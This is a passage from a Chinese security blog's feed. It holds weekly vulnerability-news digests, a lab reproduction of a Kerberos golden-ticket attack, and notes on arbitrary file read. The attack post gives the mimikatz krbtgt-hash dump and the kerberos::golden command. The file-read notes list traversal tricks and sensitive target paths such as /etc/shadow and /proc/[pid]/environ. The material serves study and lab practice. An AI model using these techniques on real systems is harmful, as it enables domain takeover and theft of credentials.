href="https://www.freebuf.com/articles/database/258970.html">https://www.freebuf.com/articles/database/258970.html</a></p></li></ol><h2 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h2><ol><li><p>蔓灵花组织（APT-C-08）使用Warzone RAT的攻击活动披露：</p><p><a href="https://mp.weixin.qq.com/s/C09P0al1nhsyyujHRp0FAw">https://mp.weixin.qq.com/s/C09P0al1nhsyyujHRp0FAw</a></p></li><li><p>黑客公开交友网站MeetMindful的228万用户的数据：</p><p><a href="https://www.zdnet.com/article/hacker-leaks-data-of-2-28-million-dating-site-users/">https://www.zdnet.com/article/hacker-leaks-data-of-2-28-million-dating-site-users/</a></p></li><li><p>KindleDrip漏洞可通过简单的电子邮件入侵Kindle设备：</p><p><a href="https://securityaffairs.co/wordpress/113743/hacking/kindle-kindledrip-exploit.html">https://securityaffairs.co/wordpress/113743/hacking/kindle-kindledrip-exploit.html</a></p></li><li><p>30人贩卖6亿条个人信息，获利800万被抓：</p><p><a href="https://www.cnbeta.com/articles/tech/1081905.htm">https://www.cnbeta.com/articles/tech/1081905.htm</a></p></li><li><p>苹果警告：3个iOS的0day漏洞被爆出，可能被广泛利用：</p><p><a href="https://thehackernews.com/2021/01/apple-warns-of-3-ios-zero-day-security.html">https://thehackernews.com/2021/01/apple-warns-of-3-ios-zero-day-security.html</a></p></li><li><p>包含1.76亿巴基斯坦手机用户的数据库被在线销售：</p><p><a href="https://www.hackread.com/pakistani-mobile-phone-users-database-sold-online/">https://www.hackread.com/pakistani-mobile-phone-users-database-sold-online/</a></p></li><li><p>巴西几乎所有人的信息泄露。泄露的数据为 14 GB，包含了 1.04 亿车辆和 4000 万家企业详细信息，潜在受影响人数 2.2 亿。</p><p><a href="https://www.solidot.org/story?sid=66764">https://www.solidot.org/story?sid=66764</a></p></li></ol><h2 id="其他资讯"><a href="#其他资讯" class="headerlink" title="其他资讯"></a>其他资讯</h2><ol><li><p>黑客窃走敏感财务信息 英特尔被迫提前发财报：</p><p><a href="https://view.inews.qq.com/k/20210122A01DGL00?uid=&amp;shareto=">https://view.inews.qq.com/k/20210122A01DGL00?uid=&amp;shareto=</a></p></li><li><p>拜登整合网安技术人才，拜登任期内，网安必将大动作不断。：</p><p><a href="https://www.aljazeera.com/news/2021/1/22/after-govt-hack-biden-enlists-world-class-cybersecurity-team">https://www.aljazeera.com/news/2021/1/22/after-govt-hack-biden-enlists-world-class-cybersecurity-team</a></p></li><li><p>工信部通报今年首批157款侵害用户权益行为APP：</p><p><a href="https://www.secrss.com/articles/28860">https://www.secrss.com/articles/28860</a></p></li><li><p>pip 停止支持 Python 2</p></li><li><p>亚洲零售巨头Dairy Farm遭受恶意勒索软件攻击：</p><p><a href="https://www.bleepingcomputer.com/news/security/pan-asian-retail-giant-dairy-farm-suffers-revil-ransomware-attack/">https://www.bleepingcomputer.com/news/security/pan-asian-retail-giant-dairy-farm-suffers-revil-ransomware-attack/</a></p></li></ol><p><strong>【以上信息均来自互联网，若有侵权，留言删除】</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/01/29/%E5%AE%89%E5%85%A8%E5%BF%AB%E8%AE%AF%EF%BC%882021-01-23%EF%BD%9E01-29%EF%BC%89/1.jpg&quot; alt&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="每周安全资讯" scheme="https://fl4g.cn/categories/%E6%AF%8F%E5%91%A8%E5%AE%89%E5%85%A8%E8%B5%84%E8%AE%AF/"/>
    
    
    <category term="网络情报" scheme="https://fl4g.cn/tags/%E7%BD%91%E7%BB%9C%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>安全快讯（2021.01.15～01.22）</title>
    <link href="https://fl4g.cn/2021/01/22/%E5%AE%89%E5%85%A8%E5%BF%AB%E8%AE%AF%EF%BC%882021-01-15%EF%BD%9E01-22%EF%BC%89/"/>
    <id>https://fl4g.cn/2021/01/22/%E5%AE%89%E5%85%A8%E5%BF%AB%E8%AE%AF%EF%BC%882021-01-15%EF%BD%9E01-22%EF%BC%89/</id>
    <published>2021-01-22T07:10:54.000Z</published>
    <updated>2021-01-22T08:55:39.896Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/01/22/%E5%AE%89%E5%85%A8%E5%BF%AB%E8%AE%AF%EF%BC%882021-01-15%EF%BD%9E01-22%EF%BC%89/1.png" alt></p><a id="more"></a><h1 id="安全快讯（2021-01-15～01-22）"><a href="#安全快讯（2021-01-15～01-22）" class="headerlink" title="安全快讯（2021.01.15～01.22）"></a>安全快讯（2021.01.15～01.22）</h1><h2 id="漏洞通告"><a href="#漏洞通告" class="headerlink" title="漏洞通告"></a>漏洞通告</h2><ol><li><p>JumpServer远程命令执行漏洞：</p><p>由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取敏感信息，或者执行相关操作控制其中所有机器，执行任意命令。</p><p>受影响的用户尽快升级 JumpServer 至最新版本。官方修复方案文档：</p><p><a href="https://github.com/jumpserver/jumpserver/blob/master/README.md">https://github.com/jumpserver/jumpserver/blob/master/README.md</a></p></li><li><p>Apache Tomcat信息泄露：</p><p>使用NTFS文件系统从网络位置提供资源时，可以绕过安全性约束或查看在某些配置中JSP的源代码。</p><p>影响版本：10.0.0-M1至10.0.0-M9、9.0.0.0.M1至9.0.39、8.5.0至8.5.59和7.0.0至7.0.106</p><p>受影响的用户尽快升级到更高版本，官网下载地址：</p><p><a href="http://tomcat.apache.org/">http://tomcat.apache.org/</a></p></li><li><p>GitLab拒绝服务：</p><p>攻击者可以通过发送格式错误的HTTP请求，在GitLab 13.7+中导致Prometheus拒绝服务</p><p>详细信息：</p><p><a href="https://gitlab.com/gitlab-org/cves/-/blob/master/2021/CVE-2021-22166.json">https://gitlab.com/gitlab-org/cves/-/blob/master/2021/CVE-2021-22166.json</a></p></li><li><p>windows10拒绝服务及NTFS 漏洞</p></li><li><p>Oracle 发布2021年1月关键补丁：</p><p>共修复了329个不同程度的漏洞，此次安全更新涉及Oracle WebLogic Server、Oracle Database Server、Oracle Java SE、Oracle Fusion Middleware、Oracle MySQL、Oracle Enterprise Manager、Oracle Systems等多个常用产品。</p><p>Oracle官方补丁需要用户持有正版软件的许可账号，使用该账号登陆<a href="https://support.oracle.com后，可以下载最新补丁。">https://support.oracle.com后，可以下载最新补丁。</a></p></li><li><p>Dnsmasq 软件多个高危漏洞：</p><p>Dnsmasq 软件提供DNS 缓存和DHCP 服务功能。攻击者利用漏洞，可造成域名劫持、流量劫持、拒绝服务等，在启用DNSSEC的情况下甚至导致远程代码执行。影响版本：Dnsmasq &lt;2.83</p><p>根据发行版包管理器及时安装升级并重启Dnsmasq软件</p></li><li><p>Drupal 目录遍历漏洞：</p><p>Drupal是使用PHP语言编写的开源内容管理框架。使用了PEAR Archive_Tar作为依赖库，在处理如.tar、.tar.gz、.bz2或.tlz等格式的压缩包时，由于过滤不严，攻击者可构造包含符号链接的压缩包，结合上传功能，可能导致存在目录遍历漏洞，甚至远程代码执行漏洞。 </p><p>升级Drupal至最新版本：</p><p><a href="https://www.drupal.org/project/drupal/issues/3193801">https://www.drupal.org/project/drupal/issues/3193801</a></p></li></ol><h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><ol><li><p>针对巴西中央银行的实时钓鱼工具包：</p><p><a href="https://blog.sucuri.net/2021/01/real-time-phishing-kit-targets-brazilian-central-bank.html">https://blog.sucuri.net/2021/01/real-time-phishing-kit-targets-brazilian-central-bank.html</a></p></li><li><p>勒索软件攻击了苏格兰环境保护局</p><p><a href="https://www.databreachtoday.com/ransomware-disrupts-scottish-environment-protection-agency-a-15768">https://www.databreachtoday.com/ransomware-disrupts-scottish-environment-protection-agency-a-15768</a></p></li><li><p>Sysrv-hello僵尸网络集木马、后门、蠕虫于一身，攻击Linux、Windows主机挖矿：</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;mid=2247497474&amp;idx=1&amp;sn=87eb580380ee3ff5efd389da419f82c9">https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;mid=2247497474&amp;idx=1&amp;sn=87eb580380ee3ff5efd389da419f82c9</a></p></li></ol><h2 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h2><ol><li><p>ESET发现针对哥伦比亚政府机构和企业的Spalax行动：</p><p><a href="https://securityaffairs.co/wordpress/113429/hacking/operation-spalax-malware.html">https://securityaffairs.co/wordpress/113429/hacking/operation-spalax-malware.html</a></p></li><li><p>OpenWRT项目论坛被攻击，论坛用户信息被窃取：</p><p><a href="https://www.zdnet.com/article/openwrt-reports-data-breach-after-hacker-gained-access-to-forum-admin-account/">https://www.zdnet.com/article/openwrt-reports-data-breach-after-hacker-gained-access-to-forum-admin-account/</a></p></li><li><p>NVIDIA Gamers面临DoS，Shield TV Bug导致的数据丢失：</p><p><a href="https://threatpost.com/nvidia-gamers-dos-data-loss-shield-tv-bugs/163200/">https://threatpost.com/nvidia-gamers-dos-data-loss-shield-tv-bugs/163200/</a></p></li><li><p>黑客泄露了7700万个Nitro PDF用户记录的完整数据库；</p><p><a href="https://www.bleepingcomputer.com/news/security/hacker-leaks-full-database-of-77-million-nitro-pdf-user-records/">https://www.bleepingcomputer.com/news/security/hacker-leaks-full-database-of-77-million-nitro-pdf-user-records/</a></p></li><li><p>The Signal、脸书和谷歌聊天应用漏洞，能让攻击者监视用户：</p><p><a href="https://www.cnbeta.com/articles/tech/1080233.htm">https://www.cnbeta.com/articles/tech/1080233.htm</a></p></li></ol><h2 id="其他资讯"><a href="#其他资讯" class="headerlink" title="其他资讯"></a>其他资讯</h2><ol><li><p>QQ，Tim读取浏览器历史记录：</p><p><a href="https://bbs.pediy.com/thread-265359.htm">https://bbs.pediy.com/thread-265359.htm</a></p></li><li><p>Flash停用致沈阳铁路局下属站段系统瘫痪，铁路信息化建设亟待加强；</p><p><a href="https://baijiahao.baidu.com/s?id=1689006506064860761&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1689006506064860761&amp;wfr=spider&amp;for=pc</a></p></li><li><p>多个 Linux 发行版考虑移除 Chromium 软件包：</p><p><a href="https://www.solidot.org/story?sid=66710">https://www.solidot.org/story?sid=66710</a></p></li><li><p>RHEL将对小企业免费：</p><p><a href="https://www.solidot.org/story?sid=66719">https://www.solidot.org/story?sid=66719</a></p></li><li><p>报告显示五分之一公司承认对远程员工进行秘密监视；</p><p><a href="https://www.cnbeta.com/articles/tech/1080073.htm">https://www.cnbeta.com/articles/tech/1080073.htm</a></p></li><li><p>德国笔记本电脑零售商因视频监控员工而受到GDPR罚款1,040万欧元：</p><p><a href="https://securityaffairs.co/wordpress/113560/digital-id/german-retailer-gdpr-fine.html">https://securityaffairs.co/wordpress/113560/digital-id/german-retailer-gdpr-fine.html</a></p></li></ol><p><strong>【以上信息均来自互联网，若有侵权，留言删除】</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/01/22/%E5%AE%89%E5%85%A8%E5%BF%AB%E8%AE%AF%EF%BC%882021-01-15%EF%BD%9E01-22%EF%BC%89/1.png&quot; alt&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="每周安全资讯" scheme="https://fl4g.cn/categories/%E6%AF%8F%E5%91%A8%E5%AE%89%E5%85%A8%E8%B5%84%E8%AE%AF/"/>
    
    
    <category term="网络情报" scheme="https://fl4g.cn/tags/%E7%BD%91%E7%BB%9C%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>域基础及黄金票据复现</title>
    <link href="https://fl4g.cn/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/"/>
    <id>https://fl4g.cn/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-01-18T08:44:55.000Z</published>
    <updated>2021-01-18T10:57:20.905Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>啥都不说，做合规工作，偶尔更新一下。新年第一个博客，就简单写一下这几天复现的经典域环境中的黄金票据问题吧。</p><h1 id="0x01-域环境搭建"><a href="#0x01-域环境搭建" class="headerlink" title="0x01 域环境搭建"></a>0x01 域环境搭建</h1><p>虚拟机安装，网卡设置仅主机模式。</p><p>域控机器：windows service2016</p><p>客户端：Windows10</p><p><em>其中域控机器的DNS与IP一致，客户端DNS设置为域控机器的IP。</em></p><a id="more"></a><p>系统安装过程省略。</p><p>在使用win10客户端加入域控时，出现大致<strong>如下错误：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;DNS 服务器失败。&quot;</span><br><span class="line"> (错误代码 0x0000232A RCODE_SERVER_FAILURE)</span><br><span class="line"></span><br><span class="line">此查询用于查找 _ldap._tcp.dc._msdcs.throld.com 的 SRV 记录</span><br></pre></td></tr></table></figure><p>此时在DNS管理器中缺少_ldap的记录。（以下为修复后出现_ldap记录）</p><p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/ldap记录.png" alt></p><p><strong>解决方案：</strong></p><p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/加域解决.png" alt></p><p>此外，本人还重启了DNS服务，域环境搭建完成。</p><h1 id="0x02-Kerberos认证"><a href="#0x02-Kerberos认证" class="headerlink" title="0x02 Kerberos认证"></a>0x02 Kerberos认证</h1><p>域内认证即采用了Kerberos协议的认证机制，其设计目标是通过密钥系统为客 户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不 依赖于主机操作系统的认证，无需基于主机地址的信任，不要求 网络上所有主机的物理安全，并假定网络上传送的数据包可以被 任意地读取、修改和插入数据。与本地认证和网络认证相比最大的区别是有个一个可信的第三方机构KDC的参与。</p><p><strong>参与域认证的三个角色：</strong></p><ul><li>Client</li><li>Server</li><li>KDC(Key Distribution Center) = DC(Domain Controller)</li></ul><h2 id="Kerberos几个重要组件"><a href="#Kerberos几个重要组件" class="headerlink" title="Kerberos几个重要组件"></a>Kerberos几个重要组件</h2><p><strong>KDC：</strong></p><p>KDC负责管理发放Ticket和记录授权的中心服务器，包含两部分：AS认证服务器（Authentication Server）,TGS服务授权服务器(Ticket Granting Server)</p><ul><li>Authentication Service：验证Client的身份，验证通过就会生成一个TGT (Ticket Granting Ticket) 给Client</li><li>Ticket Granting Service： 为client用AS给予的TGT票据换取访问Server的ticket</li></ul><p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/KDC.png" alt></p><p><strong>其他重要组件：</strong></p><ul><li>AD（account database）：存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT</li><li>Client 客户端：需要使用kerberos服务的客户端</li><li>Server 服务端：提供具体服务的服务端</li></ul><h2 id="Kerberos认证流程"><a href="#Kerberos认证流程" class="headerlink" title="Kerberos认证流程"></a>Kerberos认证流程</h2><p>kerberos认证交互过程可以简要概括为以下图片中的三次通信：</p><p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/Kerberos.png" alt></p><p><strong>粗略流程：</strong></p><ol><li>client先向DC请求，要求获取访问server的权限，当DC接收到请求之后，先由AS向AD发起请求，查看此client是否在白名单中，成功后，则由AS将TGT返回给client。 </li><li>然后client带着TGT继续向DC发起请求，要求获取访问server的权限，当DC接收到请求后，TGS会通过TGT判断此client是否有获取server服务的权限，成功后，则将Ticket返回给client。</li><li>最后client凭借Ticket去访问所请求的server，这个Ticket只对该server有效，如果要访问其他server，需要重新申请。 </li></ol><p>详细过程见：<a href="https://1sparrow.com/2018/02/18/Kerberos%E8%AE%A4%E8%AF%81%E7%9B%B8%E5%85%B3/">Kerberos认证相关</a></p><h1 id="0x03-黄金票据复现"><a href="#0x03-黄金票据复现" class="headerlink" title="0x03 黄金票据复现"></a>0x03 黄金票据复现</h1><p>简义 : 在拥有普通域用户权限和 krbtgt账号的hash的情况下,获取域管理员权限。</p><p>由来：</p><blockquote><p>Kerberos信任及完全依赖于KDC密码,由于Kerberos协议是无状态的,因此密钥分发中心KDC和票据授予服务TGS并没记录以前的交互信息。 因此票据授予服务所需使用的全部信息都位于TGT票据中。因为TGT使用krbtgt的密钥加密过, 理论上讲网络上只有两方能够解密TGT:</p><p>​    颁发票据的KDC和接受票据并创建访问网络资源的服务票据的票据授予服务TGS。 </p><p>这种情况让krbtgt成为系统中最重要的密码。最终结果是只要TGT被krbtgt账户密码正确地加密,TGT中的所有信息都是可信的。</p></blockquote><p><strong>复现流程：</strong>（以下操作均在win10客户端操作）</p><ol><li><p>提权到管理员用户，使用mimikatz导出krbtgt NTLM Hash</p><p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/hash.png" alt></p></li><li><p>生成黄金票据，在目录下生成了golden.ti票据文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden &#x2F;admin:administrator &#x2F;domain:domain-name &#x2F;sid:user-sid &#x2F;krbtgt:ntlmhash-value &#x2F;ticket:golden.ti</span><br></pre></td></tr></table></figure><p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/生成票据.png" alt></p><p>（<strong>注：</strong>SID复制时去掉最后的RID（502），不然生成的票据无法使用。）</p></li><li><p>此时使用普通用户打开mimikatz，导入golden.ti，低权限本地用户，就被提升到域管理权限。</p><p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/导入票据.png" alt></p></li><li><p>此时使用使用dir <a href="file:///ad.test.local/c$">\\ad.test.local\c$</a>查看文件夹可以访问，与之前对比：</p><p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/dir1.png" alt></p><p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/dir2.png" alt="dir2"></p></li></ol><h1 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h1><p><a href="https://cloud.tencent.com/developer/article/1596509">Windows认证 | 域认证</a></p><p><a href="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/">域渗透相关</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;啥都不说，做合规工作，偶尔更新一下。新年第一个博客，就简单写一下这几天复现的经典域环境中的黄金票据问题吧。&lt;/p&gt;
&lt;h1 id=&quot;0x01-域环境搭建&quot;&gt;&lt;a href=&quot;#0x01-域环境搭建&quot; class=&quot;headerlink&quot; title=&quot;0x01 域环境搭建&quot;&gt;&lt;/a&gt;0x01 域环境搭建&lt;/h1&gt;&lt;p&gt;虚拟机安装，网卡设置仅主机模式。&lt;/p&gt;
&lt;p&gt;域控机器：windows service2016&lt;/p&gt;
&lt;p&gt;客户端：Windows10&lt;/p&gt;
&lt;p&gt;&lt;em&gt;其中域控机器的DNS与IP一致，客户端DNS设置为域控机器的IP。&lt;/em&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://fl4g.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="域" scheme="https://fl4g.cn/tags/%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>任意文件读取</title>
    <link href="https://fl4g.cn/2020/12/15/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    <id>https://fl4g.cn/2020/12/15/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</id>
    <published>2020-12-15T10:30:46.000Z</published>
    <updated>2020-12-16T02:31:10.704Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>忙于换工作，又不知道写啥，又弃更了一段时间，看了Nu1l战队编写的从0到1 CTFER成长之路，于是记录下任意文件读取来凑个数吧。</p><h1 id="0x02-任意文件读取产生的原因"><a href="#0x02-任意文件读取产生的原因" class="headerlink" title="0x02 任意文件读取产生的原因"></a>0x02 任意文件读取产生的原因</h1><ol><li>开发者调用API时，未明确可接受的参数范围，并未对参数进行限制。</li><li>Web Server自身问题或不安全的服务器配置</li></ol><a id="more"></a><h1 id="0x03-常见触发点"><a href="#0x03-常见触发点" class="headerlink" title="0x03 常见触发点"></a>0x03 常见触发点</h1><h2 id="Web语言"><a href="#Web语言" class="headerlink" title="Web语言"></a>Web语言</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p><strong>常见函数：</strong></p><ul><li>file_get_contents()、file()、fopen()（及其文件指针操作函数fread()、gets()）</li><li>文件包含相关函数：include()、require()、include_once()、require_once()等</li><li>执行系统命令：system()、exec()等</li><li>PHP扩展：php-curl扩展、XML模块等</li></ul><p><strong>PHP特色：</strong></p><ul><li>Wrapper：指功能不同但形式相似的协议的统称，开发者可自定义。如php://协议。</li><li>Filter：开发者通过stream_filter_register进行注册，Filter对目前的Wripper进行一定的处理。内置的Wrapper会自带一些Filter。</li></ul><p>两者都可以通过php.ini禁用。</p><p><strong>实际问题中可能遇到三种情况：</strong></p><ol><li><p>文件路径前面可控，后面不可控</p><p>在较低PHP版本及容器版本中使用“\x00”截断，对应的url编码为”%00”。当服务器存在上传文件功能时，也可以尝试zip或者phar协议直接进行文件包含进而执行php代码。</p></li><li><p>文件路径后面可控，前面不可控</p><p>通过符号”../“进行目录穿越来直接读取文件，但这种情况无法使用Wrapper。如果服务端使用include等文件包含类函数，我们将无法读取PHP文件中的PHP代码。</p></li><li><p>文件路径中间可控</p><p>与第一种类似，但是无法通过Wrapper进行文件包含。</p></li></ol><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>Python的Web应用更多地倾向于通过其自身的模块启动服务，同时搭配中间件、代理服务将整个Web应用呈现给用户。用户和Web应用交互的过程本身就是含有对服务器资源文件的请求，因此Python某框架任意文件读取漏洞也是因为缺乏统一的资源文件交互的标准。</p><p><strong>常见漏洞点：</strong></p><p>框架请求静态资源文件部分，也就是最后读取文件内容的open函数，但直接导致漏洞的成因往往是开发者忽略了python函数的feature，如os.path.join()函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.join(<span class="string">&quot;/a&quot;</span>,<span class="string">&quot;/b&quot;</span>)</span><br><span class="line"><span class="string">&#x27;/b&#x27;</span></span><br></pre></td></tr></table></figure><p>过滤”.”时，可以通过传入“/”穿越到根目录。（绝对路径）</p><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>除了Java本身的文件读取函数FileInputStream，XXE导致的文件读取，Java的一些模块也支持”file://“协议。</p><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><p>通常与Rails框架有关。</p><h3 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h3><p>已知Node.js的express模块曾存在任意文件读取漏洞（CVE-2017-14849）。</p><h2 id="中间件-服务器相关"><a href="#中间件-服务器相关" class="headerlink" title="中间件/服务器相关"></a>中间件/服务器相关</h2><h3 id="Nginx错误配置"><a href="#Nginx错误配置" class="headerlink" title="Nginx错误配置"></a>Nginx错误配置</h3><p>搭配Python-Web应用一起出现，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;static&#123;</span><br><span class="line">alias &#x2F;home&#x2F;myapp&#x2F;static&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果配置文件中包含了上述配置，有可能是开发人员想让用户访问到静态资源目录，但是如果用户输入的路径是/static../，拼接到alias上就变成了/home/myapp/static/../，这时就产生了目录穿越漏洞，穿越到了上一级的myapp目录。</p><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>以MySQL为例：load_file()函数进行文件读取。另一种load data infield，需要执行完整的SQL语句</p><h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><p>使用ln -s创建软链接，上传服务器。访问链接文件即访问指向的服务器文件。</p><h3 id="FFmpeg"><a href="#FFmpeg" class="headerlink" title="FFmpeg"></a>FFmpeg</h3><p>2017年6月，FFmpeg被爆出存在任意文件读取漏洞。</p><h3 id="Docker-API"><a href="#Docker-API" class="headerlink" title="Docker-API"></a>Docker-API</h3><p>SSRF漏洞进行UNIX Socket通信的时候，就可以通过操控Docker-API把本地文件载入Docker新容器进行读取（利用Docker的ADD、COPY操作）</p><h2 id="客户端相关"><a href="#客户端相关" class="headerlink" title="客户端相关"></a>客户端相关</h2><h3 id="浏览器-Flash-XSS"><a href="#浏览器-Flash-XSS" class="headerlink" title="浏览器/Flash XSS"></a>浏览器/Flash XSS</h3><p>网站同源策略阻止JavaScript使用File协议读取客户的本地文件。Safari浏览器2017年8月被爆出客户端的本地文件读取漏洞。</p><h3 id="MarkDown语法解析器XSS"><a href="#MarkDown语法解析器XSS" class="headerlink" title="MarkDown语法解析器XSS"></a>MarkDown语法解析器XSS</h3><p>Markdown解析器具有一定的解析JavaScript的能力。</p><h1 id="0x04-常见读取路径"><a href="#0x04-常见读取路径" class="headerlink" title="0x04 常见读取路径"></a>0x04 常见读取路径</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><ul><li><p>/etc目录<br>/etc目录下多是各种应用或系统配置文件，所以其下的文件是文件读取的首要目标</p></li><li><p>/etc/passwd<br>/etc/passwd文件是Linux系统保存用户信息及其工作目录的文件，权限是所有用户/组可读，一般被用作Linux系统下文件读取漏洞存在性判断的基准。读到这个文件我们就可以知道系统存在哪些用户，它们的组是什么，他们的工作目录是什么。</p></li><li><p>/etc/shadow<br>/etc/shadow是Linux系统保存用户信息及（可能存在）密码（hash）的文件，权限是root可读写，shadow组可读。所以一般情况下，这个文件是不可读的。</p></li><li><p>/etc/apache2/<em><br>/etc/apache2/</em>是Apache配置文件，可以获知Web目录、服务端口等信息。</p></li><li><p>/etc/nginx/*</p><p>Nginx配置文件，可获知Web目录、服务端口等信息</p></li><li><p>/etc/apparmor(.d)/*</p><p>Apparmor配置文件，获知各应用系统调用的白名单、黑名单。</p></li><li><p>/etc/(cron.d/*|crontab)</p><p>定时任务文件。</p></li><li><p>/etc/environment</p><p>环境变量配置文件之一，泄漏大量目录信息，甚至可能出现secret key。</p></li><li><p>/etc/hostname</p><p>主机名</p></li><li><p>/etc/hosts</p><p>主机名查询静态表，包含指定域名解析IP的成对信息。</p></li><li><p>/etc/issue</p><p>指明系统版本</p></li><li><p>/etc/mysql/*</p><p>MySQL配置文件</p></li><li><p>/etc/php/*</p><p>PHP配置文件</p></li><li><p>/proc目录</p><p>虚拟目录，存储进程动态允许的各种信息。/proc/[pid]/可以爆破pid进程号，/proc/self/查看当前进程。</p></li></ul><blockquote><p>对应目录下的cmdline可读出比较敏感的信息，如使用<code>mysql -uxxx -pxxx</code>登录MySQL，会在cmdline中显示明文密码：</p><ul><li>/proc/[pid]/cmdline</li></ul><p>通过cwd命令可以直接跳转到当前目录：</p><ul><li>/proc/[pid]/cwd/</li></ul><p>环境变量中可能存在secret_key，这时可以通过environ进行读取：</p><ul><li>/proc/[pid]/environ</li><li>/proc/[pid]/fd(1|2…).     读取pid指向进程的stdout或stderror或其他</li><li>/proc/[pid]/maps     内存映射</li><li>/proc/[pid]/(mounts|mountinfo)    文件系统挂载情况</li><li>/proc/[pid]/net/*       网络信息</li></ul></blockquote><ul><li><p>/usr/local/nginx/conf/*</p><p>Nginx配置文件可能存在其他路径</p></li><li><p>/var/log/*                    （apache2的web应用可读/var/log/apache2/access.log分析日志）</p><p>日志文件</p></li><li><p>/var/www/html/</p><p>Apache默认Web根目录</p></li><li><p>/var/lib/php(5)/sessions</p><p>PHP 